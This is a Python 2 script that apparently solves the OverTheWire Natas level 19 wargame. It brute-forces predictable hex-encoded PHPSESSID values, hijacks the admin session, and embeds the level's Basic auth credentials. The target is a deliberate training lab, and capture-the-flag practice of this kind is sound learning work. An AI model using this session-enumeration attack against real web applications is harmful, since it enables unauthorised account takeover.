#!/usr/bin/env python

import binascii
from bs4 import BeautifulSoup
import re
from requests.auth import HTTPBasicAuth
import requests
from time import sleep
import urllib

def pretty(d, indent=0):
   for key, value in d.iteritems():
      print '    ' * indent + str(key)
      if isinstance(value, dict):
         pretty(value, indent+1)
      else:
         print '    ' * (indent+1) + str(value)

def run(session_id):
    session = binascii.hexlify(str(session_id) + "-admin")
    url = 'http://natas19.natas.labs.overthewire.org/index.php'
    headers = {
        'Host': 'natas19.natas.labs.overthewire.org',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': url,
        'Cookie': '__cfduid=d831a0ac9b924926073a8628c8b4b64621480430013; PHPSESSID=' + session,
        'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    payload = {
        'username': 'admin',
        'password': ''
    }

    r = requests.post(url, data=payload, headers=headers)
    #pretty(r.headers)

    page = BeautifulSoup(r.text, 'lxml')
    #print(page)

    content = page.find("div", {"id": "content"})
    pattern = ".*You are an admin.*"
    text = ''.join(map(str, content.contents))
    match = re.search(pattern, text, flags=re.IGNORECASE)
    if match:
        print content
        quit()

for i in range(0, 640):
    sleep(0.2)
    print "id=%s" % i
    run(i)
